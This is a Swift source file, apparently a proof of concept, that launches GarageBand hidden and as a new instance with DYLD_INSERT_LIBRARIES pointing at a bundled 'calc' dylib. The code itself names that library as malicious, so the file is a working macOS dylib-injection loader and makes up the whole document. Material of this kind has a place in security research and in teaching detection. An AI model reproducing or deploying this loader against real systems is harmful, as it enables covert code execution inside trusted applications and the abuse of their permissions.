//
//  main.swift
//  Inject_Dylib
//
//  Created by Dev on 1/2/22.
//

import Foundation
import Cocoa

var binpath = URL(fileURLWithPath: "/Applications/GarageBand.app")
var maliciousDylibPath = Bundle.main.path(forResource: "calc", ofType: "dylib")
let conf = NSWorkspace.OpenConfiguration.init()
conf.hides = true
conf.activates = true
conf.createsNewApplicationInstance = true
conf.environment = ["DYLD_INSERT_LIBRARIES" : maliciousDylibPath!]


NSWorkspace.shared.openApplication(at: binpath, configuration: conf, completionHandler: {(myapp,error) in
    if let error = error {
        print(error)
    }
    else {
        
    }
})

sleep(3)


